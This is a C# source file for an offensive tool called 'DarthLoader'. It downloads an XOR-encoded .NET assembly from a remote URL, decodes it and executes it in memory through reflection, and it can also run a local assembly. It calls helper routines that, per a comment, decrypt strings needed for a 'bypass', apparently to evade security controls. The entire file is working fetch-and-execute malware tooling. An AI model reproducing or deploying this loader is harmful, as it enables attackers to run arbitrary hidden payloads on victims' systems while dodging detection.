using System;
using System.Reflection;
using System.Threading;
using System.Net;

namespace DarthLoader
{
    class DarthLoader
    {
        public static string HelperKey = "";

        static void ExecuteLocalFile(string FilePath)
        {
            Assembly dotNetProgram = Assembly.LoadFile(FilePath);
            Object[] parameters = new String[] { null };
            dotNetProgram.EntryPoint.Invoke(null, parameters);
        }

        static byte[] FetchRemoteAssembly(string url, string xorKey = "")
        {
            byte[] programBytes = null;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient webClient = new WebClient();
            int count = 2;

            while (count >= 0 && programBytes == null)
            {
                try
                {
                    programBytes = Helpers.XorBytes(webClient.DownloadData(url), xorKey);
                }
                catch (WebException)
                {
                    Console.WriteLine("[!] Assembly not found!");
                    Console.WriteLine($"[+] Retrying download...");
                    count--;
                    Thread.Sleep(2000);
                }
                catch (NotSupportedException)
                {
                    Console.WriteLine("[!] URL not valid. Check URL argument.");
                    Environment.Exit(-1);
                }
            }
            return programBytes;
        }

        static void ExecuteRemoteAssembly(byte[] programBytes, string xorKey)
        {
            try
            {
                Assembly dotNetProgram = Assembly.Load(Helpers.XorBytes(programBytes, xorKey)) ;
                string[] parameters = new string[] { null };
                dotNetProgram.EntryPoint.Invoke(null, new object[] { parameters });
            }
            catch (TargetInvocationException)
            {
                Console.WriteLine("[!] Missing arguments for loaded assembly!");
                Environment.Exit(-1);
            }
        }

        static void Main(string[] args)
        {
            string banner =
                @"
 _______                     __     __       __                              __                   
|       \                   |  \   |  \     |  \                            |  \                  
| $$$$$$$\ ______   ______ _| $$_  | $$____ | $$      ______   ______   ____| $$ ______   ______  
| $$  | $$|      \ /      |   $$ \ | $$    \| $$     /      \ |      \ /      $$/      \ /      \ 
| $$  | $$ \$$$$$$|  $$$$$$\$$$$$$ | $$$$$$$| $$    |  $$$$$$\ \$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$\
| $$  | $$/      $| $$   \$$| $$ __| $$  | $| $$    | $$  | $$/      $| $$  | $| $$    $| $$   \$$
| $$__/ $|  $$$$$$| $$      | $$|  | $$  | $| $$____| $$__/ $|  $$$$$$| $$__| $| $$$$$$$| $$      
| $$    $$\$$    $| $$       \$$  $| $$  | $| $$     \$$    $$\$$    $$\$$    $$\$$     | $$      
 \$$$$$$$  \$$$$$$$\$$        \$$$$ \$$   \$$\$$$$$$$$\$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$$\$$                                                                                                                                           
                ";

            Console.WriteLine(banner);

            try
            {
                // testing123
                // decrypts bypass required strings
                HelperKey = args[0];
                string filePath = args[1];

                Helpers.FirstHelperFunction();
                Helpers.SecondHelperFunction();

                if (filePath.StartsWith("http"))
                {
                    string xorKey = args[2];
                    Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {xorKey}");
                    byte[] assemblyBytes = FetchRemoteAssembly(filePath, xorKey);
                    Console.WriteLine("[+] Encrypted assembly loaded into memory... ");
                    Console.WriteLine("[+] Hit any key to run...");
                    Console.ReadKey();
                    ExecuteRemoteAssembly(assemblyBytes, xorKey);
                }
                else if (args.Length < 3)
                {
                    Console.WriteLine($"[+] Loading assembly from file path: {filePath}");
                    Console.WriteLine("[+] Assembly loaded into memory... ");
                    Console.WriteLine("[+] Hit any key to run...");
                    Console.ReadKey();
                    ExecuteLocalFile(filePath);
                }
                else
                {
                    Console.WriteLine("[!] Check number of cmdline args.");
                }
            }
            catch (IndexOutOfRangeException)
            {
                Console.WriteLine("==========" + " Usage " + "==========");
                Console.WriteLine("DarthLoader.exe <UtilityXorKey> <FilePath> <Optional Xor Key for Remote Assembly>\n");
            }
        }
    }
}
